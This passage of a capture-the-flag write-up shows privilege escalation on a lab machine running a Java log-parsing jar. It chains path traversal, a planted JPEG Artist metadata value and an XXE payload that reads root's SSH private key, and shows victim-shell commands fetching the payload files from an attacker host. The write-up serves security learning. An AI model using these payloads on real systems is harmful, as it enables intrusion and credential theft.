<span id="cb12-10"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">public</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">static</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">boolean</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">isImage</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">String</span> filename<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb12-11">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>filename<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">contains</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">".jpg"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">))</span></span>
<span id="cb12-12">      <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">return</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span> </span>
<span id="cb12-13">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">return</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span></code></pre></div>
<p>2, When a line with <code>.jpg</code> is found, send the line to be parsed by function <code>parseLog</code>. <code>parseLog</code> will separate the line and return four callable chunks; (1) <code>status_code</code>, (2) <code>ip</code>, (3) <code>user_agent</code> &amp; (4) <code>uri</code>. Again, note that we can controll the <code>uri</code> parameter as we (group <code>logs</code>) own <code>redpanda.log</code>.</p>
<div class="sourceCode" id="cb13" style="background: #f1f3f5;"><pre class="sourceCode java code-with-copy"><code class="sourceCode java"><span id="cb13-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// MAIN</span></span>
<span id="cb13-2"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Map</span> parsed_data <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">parseLog</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>line<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb13-3"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">System</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">out</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">println</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>parsed_data<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">get</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"uri"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">));</span></span></code></pre></div>
<p>3, The <code>uri</code> parameter is sent to <code>getArtist</code> function where it will look for the image in <code>/opt/panda_search/src/main/resources/static</code>, which is the default path for the <code>img</code> directory where all red panda images are stored. Since we controll <code>uri</code> we can use path traversal and look for the image else where, example <code>/../../../../../../dev/shm/e.jpg</code>.</p>
<div class="sourceCode" id="cb14" style="background: #f1f3f5;"><pre class="sourceCode java code-with-copy"><code class="sourceCode java"><span id="cb14-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// MAIN</span></span>
<span id="cb14-2"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">String</span> artist <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getArtist</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>parsed_data<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">get</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"uri"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">).</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">toString</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">());</span></span>
<span id="cb14-3"></span>
<span id="cb14-4"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// getArtist</span></span>
<span id="cb14-5"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">public</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">static</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">String</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getArtist</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">String</span> uri<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">throws</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">IOException</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> JpegProcessingException <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb14-6">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">String</span> fullpath <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/opt/panda_search/src/main/resources/static"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> uri<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb14-7">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">File</span> jpgFile <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">new</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">File</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>fullpath<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span></code></pre></div>
<p>4, The meta data from found image will be checked, and the value of <code>Artist</code> will be returned to main, which will be used to create a path to a XML-file. Since we’re pointing to our custom image, we can controll the metadata with <code>exiftool</code> and use path traversal again to our own XML-file. Example, <code>exiftool -Artist="../dev/shm/pwn" e.jpg</code>, creating the xmlPath <code>/credits/../dev/shm/pwn_creds.xml</code>.</p>
<div class="sourceCode" id="cb15" style="background: #f1f3f5;"><pre class="sourceCode java code-with-copy"><code class="sourceCode java"><span id="cb15-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// getArtist</span></span>
<span id="cb15-2"> Metadata metadata <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> JpegMetadataReader<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">readMetadata</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>jpgFile<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb15-3"> <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">for</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>Directory dir <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> metadata<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getDirectories</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">())</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb15-4">  <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">for</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>Tag tag <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> dir<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getTags</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">())</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb15-5">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>tag<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getTagName</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">()</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Artist"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb15-6">     <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">return</span> tag<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getDescription</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">();</span> </span>
<span id="cb15-7"></span>
<span id="cb15-8"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// MAIN</span></span>
<span id="cb15-9"> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">System</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">out</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">println</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Artist: "</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> artist<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb15-10"> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">String</span> xmlPath <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/credits/"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> artist <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_creds.xml"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span></code></pre></div>
<p>5, Lastly all our controlled data is sent to function <code>addViewTo</code>, <code>xmlPath</code> is set to <code>/credits/../dev/shm/pwn_creds.xml</code> and <code>uri</code> to <code>/../../../../../../dev/shm/e.jpg</code>. - The element <code>uri</code> (in the XML-file) is compared to variable <code>uri</code> to make sure they are the same. This means that we need to set <code>&lt;uri&gt;/../../../../../../dev/shm/e.jpg&lt;/uri&gt;</code> in our XML, else this wont pass - <code>totalviews</code> are calculated, meaning we need to have <code>&lt;totalviews&gt;&lt;/totalviews&gt;</code> in our XML - <code>views</code> are calculcated, same as above, we need to have <code>&lt;views&gt;&lt;/views&gt;</code> in our XML</p>
<div class="sourceCode" id="cb16" style="background: #f1f3f5;"><pre class="sourceCode java code-with-copy"><code class="sourceCode java"><span id="cb16-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// MAIN</span></span>
<span id="cb16-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">addViewTo</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>xmlPath<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> parsed_data<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">get</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"uri"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">).</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">toString</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">());</span></span>
<span id="cb16-3"></span>
<span id="cb16-4"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">// addViewTo</span></span>
<span id="cb16-5"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">File</span> fd <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">new</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">File</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>path<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb16-6">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Document</span> doc <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> saxBuilder<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">build</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>fd<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb16-7">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Element</span> rootElement <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> doc<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getRootElement</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">();</span></span>
<span id="cb16-8">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">for</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Element</span> el <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> rootElement<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getChildren</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">())</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb16-9">      <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>el<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getName</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">()</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"image"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb16-10">        <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>el<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getChild</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"uri"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">).</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getText</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">().</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">equals</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>uri<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">))</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb16-11">          <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Integer</span> totalviews <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Integer</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">valueOf</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Integer</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">parseInt</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>rootElement<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getChild</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"totalviews"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">).</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getText</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">())</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb16-12">          <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">System</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">out</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">println</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Total views:"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Integer</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">toString</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>totalviews<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">intValue</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">()));</span></span>
<span id="cb16-13">          rootElement<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getChild</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"totalviews"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">).</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">setText</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Integer</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">toString</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>totalviews<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">intValue</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">()));</span></span>
<span id="cb16-14">          <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Integer</span> views <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Integer</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">valueOf</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Integer</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">parseInt</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>el<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getChild</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"views"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">).</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getText</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">()));</span></span>
<span id="cb16-15">          el<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">getChild</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"views"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">).</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">setText</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">Integer</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">toString</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>views<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">intValue</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">()</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">));</span></span>
<span id="cb16-16">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span>  </span>
<span id="cb16-17">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span> </span></code></pre></div>
<p>With all this in mind, we can download one of the xml-files at <code>/credits/</code> and use as a base. Remember that the file name here is important as it will work together with the image metadata.</p>
<div class="sourceCode" id="cb17" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  redpanda cat pwn_creds.xml</span>
<span id="cb17-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">?xml</span> version=<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1.0"</span> encoding=<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"UTF-8"</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb17-3"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>!DOCTYPE <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">foo</span> [ <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>!ENTITY xxe SYSTEM <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"file:///root/.ssh/id_rsa"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> ]<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb17-4"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>credits<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb17-5">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>author<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>pwn<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/author<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb17-6">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>image<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb17-7">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>uri<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>/../../../../../../dev/shm/e.jpg<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/uri<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb17-8">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>foo<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&amp;</span>xxe<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/foo<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb17-9">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/image<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb17-10">  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>totalviews<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>0<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/totalviews<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb17-11"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/credits<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span></code></pre></div>
<p>Next, change the metadata of a random image:</p>
<div class="sourceCode" id="cb18" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb18-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  redpanda exiftool <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Artist</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"../dev/shm/pwn"</span> e.jpg</span>
<span id="cb18-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  redpanda exiftool e.jpg <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">grep</span> Artist</span>
<span id="cb18-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Artist</span>                          : ../dev/shm/pwn</span></code></pre></div>
<p>Upload the xml and image to the victim, and write your path traversal in <code>redpanda.log</code>. Wait for maximum two minutes until the jar is executed again and the xml-file should now contain the content of root <code>id_rsa</code>.</p>
<div class="sourceCode" id="cb19" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb19-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">woodenk@redpanda:/dev/shm$</span> wget http://10.10.14.6:8888/pwn_creds.xml</span>
<span id="cb19-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">woodenk@redpanda:/dev/shm$</span> wget http://10.10.14.6:8888/e.jpg</span>
<span id="cb19-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">woodenk@redpanda:/dev/shm$</span> echo <span class="st" style="color: #20794D;
background-color: null;
